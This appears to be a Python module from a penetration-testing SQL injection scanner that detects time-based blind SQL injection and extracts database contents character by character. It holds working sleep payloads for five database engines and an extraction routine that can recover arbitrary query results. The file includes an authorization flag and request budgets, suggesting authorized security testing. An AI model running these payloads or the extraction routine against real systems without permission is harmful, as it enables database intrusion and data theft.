"""
Time-Based Blind SQL Injection Detector
========================================
High-accuracy detection and data-extraction engine for time-based blind SQL
injection (TBSQLI).

The detector works in three phases:

1. **Baseline calibration** – measures the natural response latency of the
   endpoint (median + IQR) so that injected sleep delays can be evaluated
   against real jitter.  The configured sleep delay is automatically raised
   when baseline jitter is high.

2. **Detection** – for each candidate DBMS, a payload that conditionally
   sleeps (``1=1``) is sent :attr:`~TimingStatistics` *samples* times.  An
   IQR-filtered median is compared against the baseline.  A *negative control*
   (sleep with ``1=2``, always-false condition) is then sent to confirm that
   the delay is not coincidental.

3. **Data extraction** – once a vulnerable parameter/DBMS pair is confirmed,
   individual characters of an arbitrary SQL expression can be recovered via a
   binary search over the ASCII range (~7 requests per character).

Thread safety
-------------
A single :class:`TimeBasedDetector` instance may be shared across threads.
Internal per-host request counters are guarded by a :class:`threading.Lock`.

Usage::

    from sql_attacker.engine.config import ScanConfig
    from sql_attacker.time_based_detector import TimeBasedDetector
    import requests

    cfg = ScanConfig(time_based_enabled=True)
    detector = TimeBasedDetector(cfg, request_fn=requests.get, authorized=True)
    finding = detector.detect("https://example.com/search", "q")
    if finding:
        version = detector.extract_string(
            "https://example.com/search", "q", "VERSION()"
        )
        print(version)
"""

from __future__ import annotations

import logging
import statistics
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs

from sql_attacker.engine.config import ScanConfig
from sql_attacker.engine.scoring import compute_confidence
from sql_attacker.engine.reporting import Finding, Evidence
from sql_attacker.guardrails import check_authorization, AuthorizationError

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

#: Number of timing samples per payload by default.
_DEFAULT_SAMPLES: int = 5

#: Minimum sleep duration (seconds) to request from the DBMS.
_MIN_SLEEP_SECONDS: float = 2.0

#: IQR multiplier used to classify a timing sample as an outlier.
_OUTLIER_IQR_MULTIPLIER: float = 1.5

#: If the baseline IQR (ms) exceeds this threshold we consider the endpoint
#: "jittery" and increase the requested sleep accordingly.
_HIGH_JITTER_IQR_MS: float = 500.0

#: Extra seconds added to the requested sleep when jitter is high.
_JITTER_COMPENSATION_SECONDS: float = 2.0

#: Ratio: injected median must exceed baseline median by at least this factor
#: before we consider a delay significant.
_DELAY_RATIO_THRESHOLD: float = 2.0

#: Absolute minimum gap (ms) between injected median and baseline median.
_MIN_ABSOLUTE_DELTA_MS: float = 800.0

#: Fraction of the expected sleep (ms) that the injected median must exceed
#: the baseline by before a delay is considered significant.
_DELAY_MATCH_THRESHOLD: float = 0.75

#: Sentinel used as the per-host request counter upper bound when the config
#: specifies ``per_host_request_budget=0`` (unlimited).
_UNLIMITED_BUDGET: int = sys.maxsize

#: Confidence feature values fed into :func:`compute_confidence`.
_FEAT_TIMING_DELTA = "timing_delta_significant"
_FEAT_REPEATABILITY = "repeatability"
_FEAT_BENIGN_CONTROL = "benign_control_negative"

# ---------------------------------------------------------------------------
# DBMS sleep payload templates
# ---------------------------------------------------------------------------
# Each entry is a tuple (db_type, true_condition_payload, false_condition_payload).
# ``{delay}`` is replaced at runtime with the computed float sleep duration.
# ``{param}`` is replaced with the raw (un-injected) parameter value.

_SLEEP_TEMPLATES: List[Tuple[str, str, str]] = [
    (
        "mysql",
        "' AND SLEEP({delay}) AND '1'='1",
        "' AND SLEEP({delay}) AND '1'='2",
    ),
    (
        "postgresql",
        "' AND (SELECT pg_sleep({delay})) IS NOT NULL AND '1'='1",
        "' AND (SELECT pg_sleep({delay})) IS NOT NULL AND '1'='2",
    ),
    (
        "mssql",
        "'; WAITFOR DELAY '0:0:{delay_int}';--",
        "'; IF 1=2 WAITFOR DELAY '0:0:{delay_int}';--",
    ),
    (
        "oracle",
        "' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP({delay})=0) AND '1'='1",
        "' AND 1=(SELECT 1 FROM DUAL WHERE DBMS_LOCK.SLEEP({delay})=0) AND '1'='2",
    ),
    (
        "sqlite",
        "' AND (SELECT randomblob({blob_size})) IS NOT NULL AND '1'='1",
        "' AND (SELECT randomblob({blob_size})) IS NOT NULL AND '1'='2",
    ),
]

# ---------------------------------------------------------------------------
# TimingStatistics dataclass
# ---------------------------------------------------------------------------


@dataclass
class TimingStatistics:
    """Descriptive statistics for a set of timing samples.

    Attributes
    ----------
    samples:
        Raw response-time measurements in milliseconds, in observation order.
    median:
        Median of *samples* (ms).
    iqr:
        Inter-quartile range of *samples* (ms).  ``0.0`` when fewer than 4
        samples are available (insufficient for robust IQR estimation).
    mean:
        Arithmetic mean of *samples* (ms).
    is_stable:
        ``True`` when the IQR is below :data:`_HIGH_JITTER_IQR_MS`, meaning
        the endpoint is considered to have low timing jitter.
    """

    samples: List[float]
    median: float
    iqr: float
    mean: float
    is_stable: bool

    @classmethod
    def from_samples(cls, samples: List[float]) -> "TimingStatistics":
        """Construct from a raw list of millisecond measurements.

        Parameters
        ----------
        samples:
            At least one timing measurement in milliseconds.

        Raises
        ------
        ValueError
            If *samples* is empty.
        """
        if not samples:
            raise ValueError("samples must not be empty")

        sorted_s = sorted(samples)
        n = len(sorted_s)
        med = statistics.median(sorted_s)
        mean = statistics.mean(sorted_s)

        if n >= 4:
            q1 = statistics.median(sorted_s[: n // 2])
            q3 = statistics.median(sorted_s[(n + 1) // 2 :])
            iqr = q3 - q1
        else:
            iqr = 0.0

        return cls(
            samples=list(samples),
            median=float(med),
            iqr=float(iqr),
            mean=float(mean),
            is_stable=iqr < _HIGH_JITTER_IQR_MS,
        )


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _iqr_filter(samples: List[float], multiplier: float = _OUTLIER_IQR_MULTIPLIER) -> List[float]:
    """Return *samples* with IQR-based outliers removed.

    If fewer than 4 samples are provided, all samples are returned unchanged
    (insufficient data for robust outlier detection).

    Parameters
    ----------
    samples:
        Timing measurements in any unit (ms recommended).
    multiplier:
        Fence multiplier ``k`` for the Tukey IQR rule.  Samples outside
        ``[Q1 - k*IQR, Q3 + k*IQR]`` are discarded.  Default: 1.5.
    """
    if len(samples) < 4:
        return list(samples)

    sorted_s = sorted(samples)
    n = len(sorted_s)
    q1 = statistics.median(sorted_s[: n // 2])
    q3 = statistics.median(sorted_s[(n + 1) // 2 :])
    iqr = q3 - q1

    if iqr == 0.0:
        return list(samples)

    lower = q1 - multiplier * iqr
    upper = q3 + multiplier * iqr
    return [s for s in samples if lower <= s <= upper]


def _build_payload(template: str, delay: float) -> str:
    """Fill a sleep payload template with the concrete delay value.

    Parameters
    ----------
    template:
        Payload template string containing one or more of ``{delay}``,
        ``{delay_int}``, or ``{blob_size}`` placeholders.
    delay:
        Sleep duration in seconds.
    """
    delay_int = max(1, int(round(delay)))
    # For SQLite randomblob: larger blob → longer computation.  Empirical
    # constant (10_000_000 bytes ≈ 1 s on modern hardware) scales linearly.
    blob_size = max(1, int(10_000_000 * delay))
    return (
        template
        .replace("{delay}", f"{delay:.1f}")
        .replace("{delay_int}", str(delay_int))
        .replace("{blob_size}", str(blob_size))
    )


def _inject_parameter(
    url: str,
    parameter: str,
    payload: str,
    method: str,
) -> Tuple[str, Optional[Dict[str, str]]]:
    """Return a ``(url, post_data)`` pair with *payload* injected.

    For ``GET`` requests the payload is appended to the query string.
    For ``POST`` requests it is returned as a separate dict; the URL is
    returned unchanged.

    Parameters
    ----------
    url:
        Target URL.
    parameter:
        Query / form parameter name to inject into.
    payload:
        The raw injection string (not URL-encoded; the caller's
        ``request_fn`` is expected to encode as needed).
    method:
        ``"GET"`` or ``"POST"``.
    """
    if method.upper() == "POST":
        return url, {parameter: payload}

    parsed = urlparse(url)
    existing: Dict[str, List[str]] = parse_qs(parsed.query, keep_blank_values=True)
    existing[parameter] = [payload]
    new_query = urlencode({k: v[0] for k, v in existing.items()})
    new_url = urlunparse(parsed._replace(query=new_query))
    return new_url, None


# ---------------------------------------------------------------------------
# TimeBasedDetector
# ---------------------------------------------------------------------------


class TimeBasedDetector:
    """High-accuracy time-based blind SQL injection detector and data extractor.

    Parameters
    ----------
    config:
        :class:`~sql_attacker.engine.config.ScanConfig` governing timing
        limits and request budgets.
    request_fn:
        Callable with signature ``(url, **kwargs) → response`` compatible with
        the *requests* library.  Must accept ``timeout`` as a keyword argument.
        For ``POST`` requests the caller should also accept ``data``.
    authorized:
        Must be explicitly ``True`` to allow any active probe to be sent.
        Passed straight to :func:`~sql_attacker.guardrails.check_authorization`.

    Raises
    ------
    AuthorizationError
        Immediately if *authorized* is ``False`` and a probe is attempted.
    ValueError
        If ``config.time_based_enabled`` is ``False`` when
        :meth:`detect` or :meth:`extract_string` is called.
    """

    def __init__(
        self,
        config: ScanConfig,
        request_fn: Callable,
        authorized: bool = False,
    ) -> None:
        self._config = config
        self._request_fn = request_fn
        self._authorized = authorized

        #: Number of timing samples collected per payload probe.
        self.samples_per_probe: int = _DEFAULT_SAMPLES

        # Per-host counters, guarded by a single lock for thread safety.
        self._host_counters: Dict[str, int] = {}
        self._lock = threading.Lock()

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def detect(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
    ) -> Optional[Finding]:
        """Probe *parameter* in *url* for time-based SQL injection.

        Sends baseline requests, then injects sleep payloads for each
        supported DBMS in turn.  Stops at the first confirmed finding.

        Parameters
        ----------
        url:
            Fully-qualified target URL (scheme + host + path + optional
            existing query string).
        parameter:
            Name of the HTTP parameter to inject into.
        method:
            ``"GET"`` (default) or ``"POST"``.

        Returns
        -------
        :class:`~sql_attacker.engine.reporting.Finding`
            Populated finding when injection is detected, or ``None``.

        Raises
        ------
        AuthorizationError
            When the detector was constructed with ``authorized=False``.
        ValueError
            When ``config.time_based_enabled`` is ``False``.
        """
        check_authorization(self._authorized)

        if not self._config.time_based_enabled:
            raise ValueError(
                "time_based_enabled is False in ScanConfig; "
                "set it to True to use TimeBasedDetector."
            )

        host = urlparse(url).hostname or url
        baseline_stats = self._collect_baseline(url, parameter, method, host)
        if baseline_stats is None:
            logger.debug("detect: budget exhausted during baseline for %s", url)
            return None

        sleep_seconds = self._compute_sleep_duration(baseline_stats)
        logger.debug(
            "detect: baseline median=%.1fms iqr=%.1fms stable=%s sleep=%.1fs",
            baseline_stats.median,
            baseline_stats.iqr,
            baseline_stats.is_stable,
            sleep_seconds,
        )

        for db_type, true_template, false_template in _SLEEP_TEMPLATES:
            true_payload = _build_payload(true_template, sleep_seconds)
            false_payload = _build_payload(false_template, sleep_seconds)

            finding = self._probe_dbms(
                url=url,
                parameter=parameter,
                method=method,
                host=host,
                db_type=db_type,
                true_payload=true_payload,
                false_payload=false_payload,
                sleep_seconds=sleep_seconds,
                baseline_stats=baseline_stats,
            )
            if finding is not None:
                return finding

        return None

    def extract_string(
        self,
        url: str,
        parameter: str,
        query: str,
        max_chars: int = 64,
    ) -> str:
        """Extract an arbitrary string from the database via binary search.

        Recovers the result of *query* one character at a time using a binary
        search over ASCII ordinals 32–126, requiring approximately 7 requests
        per character.

        Parameters
        ----------
        url:
            Target URL.
        parameter:
            Vulnerable parameter name.
        query:
            SQL expression whose string result should be extracted, e.g.
            ``"VERSION()"`` or ``"user()"``.
        max_chars:
            Maximum number of characters to extract.  Default: 64.

        Returns
        -------
        str
            Extracted string, truncated to *max_chars*.  Returns a partial
            string if the request budget is exhausted mid-extraction.

        Raises
        ------
        AuthorizationError
            When ``authorized=False``.
        ValueError
            When ``config.time_based_enabled`` is ``False``.
        """
        check_authorization(self._authorized)

        if not self._config.time_based_enabled:
            raise ValueError("time_based_enabled is False in ScanConfig.")

        host = urlparse(url).hostname or url
        baseline_stats = self._collect_baseline(url, parameter, "GET", host)
        if baseline_stats is None:
            return ""

        sleep_seconds = self._compute_sleep_duration(baseline_stats)
        result_chars: List[str] = []

        for pos in range(1, max_chars + 1):
            char_code = self._binary_search_char(
                url=url,
                parameter=parameter,
                host=host,
                query=query,
                position=pos,
                sleep_seconds=sleep_seconds,
                baseline_stats=baseline_stats,
            )
            if char_code is None:
                logger.debug("extract_string: budget exhausted at position %d", pos)
                break
            if char_code < 32:
                # Ordinal 0 means NULL / end-of-string from the DBMS; ordinals
                # 1–31 are non-printable control characters that also indicate
                # the string has ended or contains no useful data.
                break
            result_chars.append(chr(char_code))

        return "".join(result_chars)

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _remaining_budget(self, host: str) -> int:
        """Return the remaining host-level request budget (thread-safe)."""
        limit = self._config.per_host_request_budget
        if limit == 0:
            return _UNLIMITED_BUDGET
        with self._lock:
            used = self._host_counters.get(host, 0)
        return max(0, limit - used)

    def _consume_budget(self, host: str, n: int = 1) -> bool:
        """Attempt to consume *n* requests from the host budget.

        Returns ``True`` on success, ``False`` when the budget would be
        exceeded.
        """
        limit = self._config.per_host_request_budget
        if limit == 0:
            return True
        with self._lock:
            used = self._host_counters.get(host, 0)
            if used + n > limit:
                return False
            self._host_counters[host] = used + n
        return True

    def _timed_request(
        self,
        url: str,
        method: str,
        post_data: Optional[Dict[str, str]] = None,
    ) -> Optional[float]:
        """Send one HTTP request and return elapsed time in milliseconds.

        Returns ``None`` when the request fails (network error, timeout, etc.).

        Parameters
        ----------
        url:
            Request URL.
        method:
            ``"GET"`` or ``"POST"``.
        post_data:
            Form-encoded POST body.  Ignored for GET requests.
        """
        timeout = self._config.time_based_max_delay_seconds + 5.0
        start = time.monotonic()
        try:
            if method.upper() == "POST" and post_data:
                self._request_fn(url, data=post_data, timeout=timeout)
            else:
                self._request_fn(url, timeout=timeout)
        except Exception as exc:  # noqa: BLE001 – request_fn is an arbitrary callable;
            # we genuinely cannot enumerate all exception types it may raise.
            logger.debug("_timed_request: request error: %s", exc)
            return None
        elapsed_ms = (time.monotonic() - start) * 1000.0
        return elapsed_ms

    def _collect_baseline(
        self,
        url: str,
        parameter: str,
        method: str,
        host: str,
    ) -> Optional[TimingStatistics]:
        """Send benign baseline requests and return timing statistics.

        Uses :attr:`samples_per_probe` requests with an empty string injected
        into *parameter* (preserves existing parameter semantics).

        Returns ``None`` when the host budget is exhausted before all samples
        can be collected.
        """
        n = self.samples_per_probe
        if not self._consume_budget(host, n):
            return None

        samples: List[float] = []
        inj_url, post_data = _inject_parameter(url, parameter, "", method)
        for _ in range(n):
            elapsed = self._timed_request(inj_url, method, post_data)
            if elapsed is not None:
                samples.append(elapsed)

        if not samples:
            return None

        return TimingStatistics.from_samples(samples)

    def _collect_timing(
        self,
        url: str,
        parameter: str,
        payload: str,
        method: str,
        host: str,
    ) -> Optional[TimingStatistics]:
        """Collect :attr:`samples_per_probe` timing measurements for *payload*.

        Returns ``None`` when the host budget is exhausted.
        """
        n = self.samples_per_probe
        if not self._consume_budget(host, n):
            return None

        inj_url, post_data = _inject_parameter(url, parameter, payload, method)
        samples: List[float] = []
        for _ in range(n):
            elapsed = self._timed_request(inj_url, method, post_data)
            if elapsed is not None:
                samples.append(elapsed)

        if not samples:
            return None

        return TimingStatistics.from_samples(_iqr_filter(samples))

    def _compute_sleep_duration(self, baseline: TimingStatistics) -> float:
        """Return the sleep duration (s) appropriate for *baseline* jitter.

        Starts at :data:`_MIN_SLEEP_SECONDS`, adding
        :data:`_JITTER_COMPENSATION_SECONDS` when the endpoint is jittery,
        and capping at :attr:`ScanConfig.time_based_max_delay_seconds`.
        """
        delay = _MIN_SLEEP_SECONDS
        if not baseline.is_stable:
            delay += _JITTER_COMPENSATION_SECONDS
        return min(delay, self._config.time_based_max_delay_seconds)

    def _is_delay_significant(
        self,
        injected: TimingStatistics,
        baseline: TimingStatistics,
        sleep_seconds: float,
    ) -> bool:
        """Return ``True`` when *injected* timings indicate a real sleep delay.

        Two conditions must both hold:

        1. The injected median exceeds the baseline median by at least
           :data:`_DELAY_RATIO_THRESHOLD` × *sleep_seconds* × 500 ms (loose
           lower bound so very fast baseline endpoints are covered).
        2. The absolute delta between medians exceeds
           :data:`_MIN_ABSOLUTE_DELTA_MS`.
        """
        delta_ms = injected.median - baseline.median
        expected_ms = sleep_seconds * 1000.0
        return (
            delta_ms >= _MIN_ABSOLUTE_DELTA_MS
            and injected.median >= baseline.median + expected_ms * _DELAY_MATCH_THRESHOLD
        )

    def _probe_dbms(
        self,
        url: str,
        parameter: str,
        method: str,
        host: str,
        db_type: str,
        true_payload: str,
        false_payload: str,
        sleep_seconds: float,
        baseline_stats: TimingStatistics,
    ) -> Optional[Finding]:
        """Probe a single DBMS sleep variant and return a Finding if confirmed.

        Sends the *true_payload* (``1=1``) and verifies the delay, then sends
        the *false_payload* (``1=2``) as a negative control to ensure the
        delay is conditional.
        """
        logger.debug("_probe_dbms: testing %s on %s[%s]", db_type, url, parameter)

        # --- True condition (should sleep) ---
        true_stats = self._collect_timing(url, parameter, true_payload, method, host)
        if true_stats is None:
            logger.debug("_probe_dbms: budget exhausted (true probe, %s)", db_type)
            return None

        if not self._is_delay_significant(true_stats, baseline_stats, sleep_seconds):
            logger.debug(
                "_probe_dbms: no significant delay for %s (median=%.1fms baseline=%.1fms)",
                db_type,
                true_stats.median,
                baseline_stats.median,
            )
            return None

        # --- Negative control (should NOT sleep) ---
        false_stats = self._collect_timing(url, parameter, false_payload, method, host)
        benign_negative = False
        if false_stats is not None:
            benign_negative = not self._is_delay_significant(
                false_stats, baseline_stats, sleep_seconds
            )
            logger.debug(
                "_probe_dbms: negative control %s median=%.1fms (benign_negative=%s)",
                db_type,
                false_stats.median,
                benign_negative,
            )

        # --- Score ---
        features: Dict[str, float] = {
            _FEAT_TIMING_DELTA: 1.0,
            _FEAT_REPEATABILITY: 1.0 if len(true_stats.samples) >= 3 else 0.5,
            _FEAT_BENIGN_CONTROL: 1.0 if benign_negative else 0.0,
        }
        scoring = compute_confidence(features)
        logger.debug(
            "_probe_dbms: %s scored %.3f (%s)",
            db_type,
            scoring.score,
            scoring.verdict,
        )

        # Build evidence record for the true probe.
        evidence = Evidence(
            payload=true_payload,
            request_summary=(
                f"{method.upper()} {url} [{parameter}={true_payload[:60]}...]"
                if len(true_payload) > 60
                else f"{method.upper()} {url} [{parameter}={true_payload}]"
            ),
            response_length=0,
            response_body_excerpt="",
            timing_samples_ms=true_stats.samples,
            baseline_median_ms=baseline_stats.median,
            technique="time",
        )

        finding = Finding(
            parameter=parameter,
            technique="time",
            db_type=db_type,
            confidence=scoring.score,
            verdict=scoring.verdict,
            evidence=[evidence],
            url=url,
            method=method.upper(),
            score_rationale=scoring.rationale,
        )
        return finding

    # ------------------------------------------------------------------
    # Binary search extraction
    # ------------------------------------------------------------------

    def _send_conditional_sleep(
        self,
        url: str,
        parameter: str,
        host: str,
        condition_sql: str,
        sleep_seconds: float,
        baseline_stats: TimingStatistics,
    ) -> Optional[bool]:
        """Send a single payload where sleep fires only if *condition_sql* is TRUE.

        Returns ``True`` if a significant delay was observed, ``False`` if not,
        or ``None`` when the request budget is exhausted.

        Parameters
        ----------
        condition_sql:
            Raw SQL boolean expression (no quotes needed around it).
        """
        payload = (
            f"' AND (SELECT CASE WHEN ({condition_sql}) "
            f"THEN SLEEP({sleep_seconds:.1f}) ELSE 0 END)=0 AND '1'='1"
        )
        if not self._consume_budget(host, 1):
            return None

        inj_url, post_data = _inject_parameter(url, parameter, payload, "GET")
        elapsed = self._timed_request(inj_url, "GET", post_data)
        if elapsed is None:
            return None

        dummy_stats = TimingStatistics.from_samples([elapsed])
        return self._is_delay_significant(dummy_stats, baseline_stats, sleep_seconds)

    def _binary_search_char(
        self,
        url: str,
        parameter: str,
        host: str,
        query: str,
        position: int,
        sleep_seconds: float,
        baseline_stats: TimingStatistics,
    ) -> Optional[int]:
        """Binary-search the ASCII ordinal of character at *position* in *query*.

        Returns the ordinal (0 means null / end-of-string; any value < 32 is
        treated as non-printable and signals end-of-string to the caller), or
        ``None`` if the budget is exhausted before the search completes.

        Uses the condition::

            ASCII(SUBSTRING((<query>), <position>, 1)) > <mid>

        which sleeps when true, allowing binary reduction of the range [0, 126].
        The lower bound of 0 is intentional: ``ASCII()`` returns 0 for a null
        or empty string, which the caller interprets as end-of-string.

        Parameters
        ----------
        position:
            1-based character position within the SQL expression result.
        """
        lo, hi = 0, 126  # ordinal search space: 0 (null) .. 126 (~)

        while lo < hi:
            mid = (lo + hi) // 2
            condition = (
                f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"
            )
            slept = self._send_conditional_sleep(
                url, parameter, host, condition, sleep_seconds, baseline_stats
            )
            if slept is None:
                return None  # budget exhausted
            if slept:
                lo = mid + 1
            else:
                hi = mid

        return lo  # lo == hi is the resolved ordinal
